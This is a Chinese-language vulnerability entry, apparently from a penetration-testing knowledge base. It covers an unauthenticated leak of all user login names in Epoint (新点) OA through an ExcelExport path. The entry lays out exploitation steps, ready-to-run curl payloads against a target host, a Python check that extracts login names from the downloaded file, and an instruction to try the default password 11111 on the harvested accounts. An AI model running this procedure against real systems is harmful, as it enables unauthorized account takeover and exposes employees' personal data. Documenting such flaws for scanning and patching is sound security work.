---
id: EPOINT-INFO-LEAK
title: 新点OA ExcelExport 用户信息泄露漏洞
product: epoint-oa
vendor: 新点软件
version_affected: "all versions"
severity: MEDIUM
tags: [info_disclosure, 无需认证, 国产, oa]
fingerprint: ["新点OA"]
---

## 漏洞描述

新点OA 存在敏感信息泄露漏洞，攻击者无需认证即可通过 `/ExcelExport/人员列表.xls` 路径下载包含所有用户登录名的 Excel 文件。获取登录名后可结合弱口令（默认密码 11111）登录后台。

## 影响版本

- 新点OA（所有已知版本）

## 前置条件

- 无需认证
- 目标运行新点OA

## 利用步骤

1. 确认目标为新点OA
2. 访问 ExcelExport 路径下载人员列表
3. 从 Excel 中获取所有用户登录名
4. 使用默认密码 11111 尝试登录

## Payload

```bash
# 下载用户列表
curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o user_list.xls

# URL 解码版
curl -s "http://target/ExcelExport/人员列表.xls" -o user_list.xls
```

## 验证方法

未登录直接下载，判据是下载到的确实是人员台账，而不是登录页或被重定向的错误页。

```bash
curl -s "http://target/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls" -o user_list.xls

# 判据 1：是 OLE/Excel 复合文档而非 HTML
file user_list.xls
# 期望：Composite Document File / Microsoft Excel

# 判据 2：文件里有人员台账的列名与真实登录名（xls 内字符串为 UTF-16LE）
python3 -c "
import re
d = open('user_list.xls','rb').read()
print([m.decode('utf-16-le','ignore') for m in re.findall(rb'(?:[\x20-\x7e]\x00){3,}', d)][:20])
"
```

判据：文件类型为 Excel 复合文档，且内容里出现人员台账的列名与真实登录名（如 `登录名`/`loginName` 列及其取值）。抓到登录名是敏感结构化数据，不是产品词。

反例：接口返回 200 且 `Content-Type` 是 `application/vnd.ms-excel`，但内容其实是登录页 HTML 或空模板（无任何用户名记录）—— 只是路由存在，信息泄露不成立。

## 指纹确认

```bash
curl -s "http://target/" | grep -i "新点"
```
